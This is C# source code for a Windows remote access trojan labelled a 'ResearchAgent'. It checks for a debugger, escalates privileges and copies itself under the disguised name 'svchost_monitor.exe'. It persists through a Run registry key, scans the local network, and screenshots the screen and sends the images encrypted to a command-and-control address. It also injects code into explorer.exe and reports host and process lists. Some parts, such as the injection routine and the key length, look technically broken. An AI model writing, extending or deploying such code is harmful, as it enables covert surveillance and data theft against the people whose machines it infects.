using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Drawing; //BY_KOICH
using System.Drawing.Imaging;

namespace Triumphmania.ResearchAgent
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);

        static void Main(string[] args)
        {
            if (IsDebuggerPresent())
            {
                Environment.Exit(0);
            }

            if (args.Length > 0 && args[0] == "--elevate")
            {
                string target = System.Reflection.Assembly.GetExecutingAssembly().Location;
                ProcessStartInfo psi = new ProcessStartInfo(target);
                psi.Verb = "runas";
                psi.UseShellExecute = true;
                Process.Start(psi);
                Environment.Exit(0);
            }

            try
            {
                int pid = Process.GetCurrentProcess().Id;
                string appName = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
                string sysDir = Environment.SystemDirectory;
                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                string copyPath = Path.Combine(sysDir, "svchost_monitor.exe");

                if (selfPath != copyPath)
                {
                    File.Copy(selfPath, copyPath, true);
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("SystemMonitor", copyPath);
                    }
                }

                Thread persistence = new Thread(PersistenceLoop);
                persistence.IsBackground = true;
                persistence.Start();

                Thread network = new Thread(NetworkLoop);
                network.IsBackground = true;
                network.Start();

                Thread screenshot = new Thread(ScreenshotLoop);
                screenshot.IsBackground = true;
                screenshot.Start();

                Thread inject = new Thread(InjectionRoutine);
                inject.IsBackground = true;
                inject.Start();

                while (true)
                {
                    Thread.Sleep(60000);
                    string data = GatherSystemInfo();
                    SendToC2(data);
                }
            }
            catch
            {
                Thread.Sleep(30000);
                Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
                Environment.Exit(0);
            }
        }

        static void PersistenceLoop()
        {
            while (true)
            {
                try
                {
                    string sysDir = Environment.SystemDirectory;
                    string copyPath = Path.Combine(sysDir, "svchost_monitor.exe");
                    if (!File.Exists(copyPath))
                    {
                        string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                        File.Copy(selfPath, copyPath, true);
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                        {
                            if (key != null)
                            {
                                key.SetValue("SystemMonitor", copyPath);
                            }
                        }
                    }
                }
                catch { }
                Thread.Sleep(120000);
            }
        }

        static void NetworkLoop()
        {
            Random rnd = new Random();
            while (true)
            {
                try
                {
                    string ip = "192.168.1." + rnd.Next(1, 254);
                    int port = rnd.Next(10000, 60000);
                    using (TcpClient client = new TcpClient())
                    {
                        IAsyncResult ar = client.BeginConnect(ip, port, null, null);
                        ar.AsyncWaitHandle.WaitOne(500);
                        if (client.Connected)
                        {
                            client.EndConnect(ar);
                            string payload = "PORTSCAN: " + ip + ":" + port + " OPEN";
                            byte[] data = Encoding.UTF8.GetBytes(payload);
                            client.GetStream().Write(data, 0, data.Length);
                        }
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }

        static void ScreenshotLoop()
        {
            while (true)
            {
                try
                {
                    Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, SystemInformation.VirtualScreen.Size);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        byte[] imgData = ms.ToArray();
                        string base64 = Convert.ToBase64String(imgData);
                        byte[] encrypted = EncryptData(Encoding.UTF8.GetBytes(base64));
                        SendToC2Encrypted(encrypted);
                    }
                    bmp.Dispose();
                }
                catch { }
                Thread.Sleep(30000);
            }
        }

        static void InjectionRoutine()
        {
            while (true)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName("explorer");
                    if (procs.Length == 0)
                    {
                        Thread.Sleep(5000);
                        continue;
                    }
                    Process target = procs[0];
                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, target.Id);
                    if (hProcess == IntPtr.Zero)
                    {
                        Thread.Sleep(5000);
                        continue;
                    }
                    string dllPath = Path.Combine(Environment.SystemDirectory, "wininet.dll");
                    if (!File.Exists(dllPath))
                    {
                        dllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "wininet.dll");
                    }
                    byte[] dllBytes = File.ReadAllBytes(dllPath);
                    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40);
                    if (allocMem != IntPtr.Zero)
                    {
                        IntPtr bytesWritten;
                        WriteProcessMemory(hProcess, allocMem, dllBytes, (uint)dllBytes.Length, out bytesWritten);
                        IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
                        if (thread != IntPtr.Zero)
                        {
                            break;
                        }
                    }
                }
                catch { }
                Thread.Sleep(60000);
            }
        }

        static string GatherSystemInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("HOST: " + Environment.MachineName);
            sb.AppendLine("USER: " + Environment.UserName);
            sb.AppendLine("OS: " + Environment.OSVersion);
            sb.AppendLine("PROCESSES:");
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    sb.AppendLine("  " + p.Id + " - " + p.ProcessName);
                }
                catch { }
            }
            return sb.ToString();
        }

        static byte[] EncryptData(byte[] input)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes("TriumphManiaKey1234567890123456");
                aes.IV = Encoding.UTF8.GetBytes("TriumphManiaIV12");
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(input, 0, input.Length);
                        cs.FlushFinalBlock();
                        return ms.ToArray();
                    }
                }
            }
        }

        static void SendToC2(string data)
        {
            try
            {
                IPAddress ip = IPAddress.Parse("10.0.0.5");
                TcpClient client = new TcpClient();
                client.Connect(ip, 443);
                byte[] buffer = Encoding.UTF8.GetBytes(data);
                client.GetStream().Write(buffer, 0, buffer.Length);
                client.Close();
            }
            catch { }
        }

        static void SendToC2Encrypted(byte[] data)
        {
            try
            {
                IPAddress ip = IPAddress.Parse("10.0.0.5");
                TcpClient client = new TcpClient();
                client.Connect(ip, 444);
                client.GetStream().Write(data, 0, data.Length);
                client.Close();
            }
            catch { }
        }

        static void AntiDebug()
        {
            int val = 0;
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, 0x1F, ref val, sizeof(int));
        }
    }
}
